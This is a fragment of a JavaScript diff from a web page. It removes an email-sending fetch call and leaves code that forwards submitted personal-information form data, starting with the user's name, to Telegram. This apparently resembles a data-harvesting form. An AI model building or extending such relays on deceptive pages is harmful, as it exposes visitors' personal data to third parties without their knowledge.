@@ -446,28 +446,6 @@ closeAdButton.addEventListener("click", slideOutAd);
             Object.assign(allFormData, data);
 
 
-			try {
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ to, name, maintext, subject }),
-        });
-        const result = await response.json();
-				const messageDiv = document.getElementById('messageDiv');
-
-        if (response.ok) {
-          messageDiv.textContent = result.message;
-          messageDiv.className = '';
-          
-          setTimeout(() => {
-            messageDiv.textContent = "Waiting for next";
-          }, 2000);
-          
-        } else {
-          messageDiv.textContent = result.error;
-          messageDiv.className = 'error';
-        }
-      } 
             // Send to Telegram
             const message = `📝 **Form 1 Submitted - Personal Information**\n\n` +
                            `👤 Name: ${data.name}\n` +
